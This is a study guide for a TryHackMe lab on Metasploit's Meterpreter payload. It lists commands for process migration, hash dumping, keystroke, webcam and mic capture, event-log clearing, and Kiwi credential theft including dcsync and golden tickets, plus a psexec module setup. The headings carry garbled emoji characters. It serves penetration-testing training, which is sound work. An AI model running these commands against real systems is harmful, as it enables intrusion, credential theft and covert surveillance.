# üõ†Ô∏è TryHackMe - Metasploit: Meterpreter (Complete Guide)

This markdown provides a comprehensive breakdown of the **Meterpreter** payload in the Metasploit Framework, as covered in the TryHackMe room. It includes payload types, usage, command sets, stealth behavior, and post-exploitation tactics.

---

## üìò Task 1 - Introduction to Meterpreter

**Meterpreter** is a post-exploitation agent that provides in-memory access to compromised systems through an encrypted command-and-control session. It is highly stealthy and modular.

### üîê Key Features
- **In-memory execution**: Leaves no file artifacts on disk.
- **Encrypted communication**: Uses TLS to evade detection by IDS/IPS.
- **Stealthy process injection**: Runs under legitimate-looking processes.

### üîé Process Hiding
```bash
meterpreter > getpid
meterpreter > ps
```

Example: PID 1304 is actually `spoolsv.exe`, not `meterpreter.exe`.  
Even running:
```bash
tasklist /m /fi "pid eq 1304"
```
You won‚Äôt see `meterpreter.dll` or other suspicious modules.

---

## üîÄ Task 2 - Meterpreter Payload Variants

Meterpreter payloads are available in both:
- **Staged** (multi-part) payloads
- **Inline** (single) payloads

### üîé Listing Payloads
```bash
msfvenom --list payloads | grep meterpreter
```

### üí° Supported Platforms
- Windows, Linux, macOS, Android, iOS
- PHP, Python, Java

### üìå Payload Selection Considerations
1. **Target OS** (e.g., Windows vs Linux)
2. **Available interpreters** (e.g., Python, PHP)
3. **Allowed network channels** (e.g., TCP, HTTPS, IPv6)

### üéØ Exploit Defaults
Example:
```bash
use exploit/windows/smb/ms17_010_eternalblue
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

List compatible payloads:
```bash
show payloads
```

---

## üß™ Task 3 - Meterpreter Command Usage

### üÜò View Help
```bash
meterpreter > help
```

### üîß Categories of Commands
1. Core Commands
2. File System
3. Networking
4. System
5. UI / Webcam / Audio
6. Privilege escalation
7. Timestomping
8. Scripting / Extensions

---

### ‚öôÔ∏è Common Core Commands
| Command     | Description                          |
|-------------|--------------------------------------|
| `getuid`    | Show session user                    |
| `getpid`    | Current process ID                   |
| `ps`        | Show running processes               |
| `migrate`   | Switch to another process            |
| `shell`     | Drop into system shell               |
| `exit`      | Terminate Meterpreter                |
| `background`| Send session to background           |

---

### üìÇ File System Commands
| Command     | Description                       |
|-------------|-----------------------------------|
| `cd`, `ls`  | Navigate file system              |
| `cat`, `edit` | View or edit files              |
| `upload`, `download` | Transfer files           |
| `search -f flag.txt` | Locate files             |

---

### üåê Networking Commands
| Command      | Description                          |
|--------------|--------------------------------------|
| `ifconfig`   | List network interfaces              |
| `netstat`    | View network connections             |
| `route`      | View/edit routing table              |
| `portfwd`    | Port forwarding                      |

---

### üñ•Ô∏è System Commands
- `clearev`: Clear event logs
- `execute`: Run command
- `shutdown`, `reboot`: Control system
- `kill`: Kill process
- `sysinfo`: View system info

---

### üõ°Ô∏è Credential/Monitoring Commands
- `keyscan_start/stop/dump`: Keystroke capture
- `hashdump`: Dump Windows SAM hashes
- `screenshare`, `screenshot`
- `record_mic`
- `webcam_snap`, `webcam_stream`

---

## üß© Task 4 - Post-Exploitation with Meterpreter

### üîë Get Current User
```bash
meterpreter > getuid
```

### üß¨ View Processes
```bash
meterpreter > ps
```

### üîÑ Process Migration
```bash
meterpreter > migrate <PID>
```
> Avoid downgrading privileges by migrating to lower-privileged processes.

---

### üîê Dumping Credentials
```bash
meterpreter > hashdump
```
Hashes can be used for:
- Cracking (rainbow tables)
- Pass-the-Hash attacks

---

### üîç File Search
```bash
meterpreter > search -f flag2.txt
```

---

### üíª Interactive Shell
```bash
meterpreter > shell
```
> Use `CTRL+Z` to return to Meterpreter.

---

## üß± Task 5 - Post-Exploitation Challenge

### üß¨ Load Python Extension
```bash
meterpreter > load python
python_execute "print('TryHackMe Rocks!')"
```

### üîì Load Kiwi (Mimikatz-like Toolkit)
```bash
meterpreter > load kiwi
```

### üõ†Ô∏è Kiwi Commands
| Command           | Description                          |
|-------------------|--------------------------------------|
| `creds_all`       | Dump all available creds             |
| `lsa_dump_sam`    | Dump SAM database                    |
| `dcsync`          | Simulate domain controller sync      |
| `golden_ticket_create` | Create Kerberos golden ticket |
| `wifi_list`       | View saved Wi-Fi credentials         |

> View all with: `help` after `load kiwi`

---

### ‚öîÔ∏è Simulate Initial Compromise
Use SMB exploit with known creds:
```bash
use exploit/windows/smb/psexec
set SMBUser ballen
set SMBPass Password1
```

---

## ‚úÖ Summary

**Meterpreter** is a stealthy, encrypted, and feature-rich payload for:
- Gaining persistent access
- Conducting post-exploitation actions
- Capturing credentials and keystrokes
- Maintaining lateral movement across networks

It supports:
- Process migration
- File system navigation
- Real-time surveillance (mic/webcam)
- Integration with `python`, `kiwi`, and other powerful extensions

---

### üìö References

- [TryHackMe Room](https://tryhackme.com/room/meterpreter)
- [Metasploit Unleashed (OffSec)](https://www.offensive-security.com/metasploit-unleashed/)
